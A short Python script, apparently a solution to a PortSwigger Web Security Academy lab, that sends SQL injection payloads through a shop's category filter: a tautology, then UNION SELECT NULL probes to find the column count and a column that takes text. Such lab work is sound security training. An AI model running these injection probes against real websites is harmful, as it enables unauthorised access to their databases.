import requests

session = requests.Session()

BASE_URL="https://0a26004c040936d680b7629400f60016.web-security-academy.net"
FILTER_URL=BASE_URL+"/filter"

def payload_request(payload:str) ->requests.Response:
    
    params={
        "category":payload
    }
    response = session.get(FILTER_URL,params=params, timeout=10)
    print(f"{response.status_code} {payload}")
    return response

def find_column_len()->int:
    for num in range(1,10):
        payload = f"' union select {",".join(["NULL"]*num)}-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return num

def find_column_str_index(column_len:int)->int:
    
    for num in range(0, column_len):
        arrs = ["NULL"] * column_len
        arrs[num] = "'xcavSG'"
        payload = f"' union select {",".join(arrs)}-- "
        response = payload_request(payload)
        if response and response.status_code==200:
            return num

def main():
    payload_request("Gifts")
    payload_request("' or 1=1-- ")
    column_len = find_column_len()
    find_column_str_index(column_len=column_len)
    

if __name__=="__main__":
    main()